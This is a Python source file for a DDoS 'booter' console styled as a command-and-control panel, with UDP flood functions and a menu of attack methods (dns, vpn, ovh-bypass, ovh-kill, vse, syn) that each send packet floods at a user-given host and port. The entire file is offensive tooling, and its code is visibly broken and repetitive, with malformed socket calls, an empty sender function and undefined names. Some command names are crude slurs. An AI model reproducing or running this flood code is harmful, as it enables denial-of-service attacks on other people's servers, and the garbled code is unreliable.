invalid = """\x1b[38;2;0;204;111mInvalid\x1b[38;2;0;204;111mmCommands"""
cookies = open(".sinfull_cookies","w+")

fsubs = True
tpings = True
pscans = True
liips = True
tattacks = True
uaid = True
said = True
running = True
iaid = True
haid = True
aid = True
attack = True
ldap = True
http = True
atks = True

def randsender(host, timer, port, lunch, payload):
	global atks
	global running
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global ldap
	global http

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP, socket.SOCK_STREAM, socket.SOCK_DGRAM, socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	atks += 1
	running += 1
	http += 1
	ldap += 1
	attack += 1
	aid += 1
	haid += 1
	iaid += 1
	said += 1
	uaid += 1
	tattacks += 1
	liips += 1
	pscans += 1
	tpings += 1
	fsubs += 1
	while time.time() < timeout and ldap and attack and tpings and pscans and liips and tattacks and running and uaid and said and http and aid:
		sock.sendto(lunch (host, int(port)))
	atks -= 1
	running -= 1
	http -= 1
	ldap -= 1
	attack -= 1
	aid -= 1
	haid -= 1
	iaid -= 1
	said -= 1
	uaid -= 1
	tattacks -= 1
	liips -= 1
	pscans -= 1
	tpings -= 1
	fsubs -= 1
              
              


def stdsender(host, port, timer, lunch, payload):
	global atks
	global running
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global ldap
	global http

def attack_fortigayserver(host, port, timer, lunch, payload):
	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_IGMP)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	http += 1
	ldap += 1
	attack += 1
	aid += 1
	haid += 1
	iaid += 1
	said += 1
	uaid += 1
	tattacks += 1
	liips += 1
	pscans += 1
	tpings += 1
	fsubs += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1
	http -= 1
	ldap -= 1
	attack -= 1
	aid -= 1
	haid -= 1
	iaid -= 1
	said -= 1
	uaid -= 1
	tattacks -= 1
	liips -= 1
	pscans -= 1
	tpings -= 1
	fsubs -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		powerran = (random.randint(11011,60005))
		sys.stdout.write("\x1b]2;[-] TransformerXBumblebee | Api Connected [999999] | Backup Server [999999] | Online User [999999] | Admin: [TransformerXBumblebee] | POWER : {}% [STABLE]\x07".format (powerran,bots))
		sin = input('''\033[93m╔══[{}\033[94m[@rootacces]\033[93mRab\033[94mbit\033[93mLiocC2\033[94m]
\033[94m╚\033[93m═\033[94m═\033[93m═\033[94m═\033[93m➤➤➤➤ \033[94m'''.format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("cls")
			print (banner)
			main()
		elif sinput == "layer4":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (layer4)
			main()
		elif sinput == "plan":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (plan)
			main()
		elif sinput == "methods":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (methods)
			main()
		elif sinput == "bots":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (bots)
			main()
		elif sinput =="vip":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (vip)
			main()
		elif sinput == "primitive":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (primitive)
			main()
		elif sinput == "slaprape":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (slaprape)
			main()
		elif sinput == "raw":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (raw)
			main()
		elif sinput == "helpservice":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (helpservice)
			main()
		elif sinput == "layer7":
			os.system ("cls")
			print (layer7)
			main()
		elif sinput == "pit":
			os.system ("cls")
			print ("pit")
			main()
		elif sinput == "plan":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print ("plan")
			main()
		elif sinput == "":
			print(invalid)
			main()
		elif sinput == "logout":
			print("Leaving Service in 3 Seconds")
			time.sleep(3)
			os.system ("cls")
			print (mt)
			exit()
		elif sinput == "std":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "hotspot":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpn":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						bpass = 666225
						lunch = random._urandom(int(bpass))
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-slav":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						bpass = 666225
						lunch = random._urandom(int(bpass))
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-nat":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						bpass = 666225
						lunch = random._urandom(int(bpass))
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-xv":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						bpass = 666225
						lunch = random._urandom(int(bpass))
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-bypass":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						bpass = 666225
						lunch = random._urandom(int(bpass))
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-kill":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						bpass = 666225
						lunch = random._urandom(int(bpass))
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-rape":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						bpass = 666225
						lunch = random._urandom(int(bpass))
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-slump":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						bpass = 666225
						lunch = random._urandom(int(bpass))
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
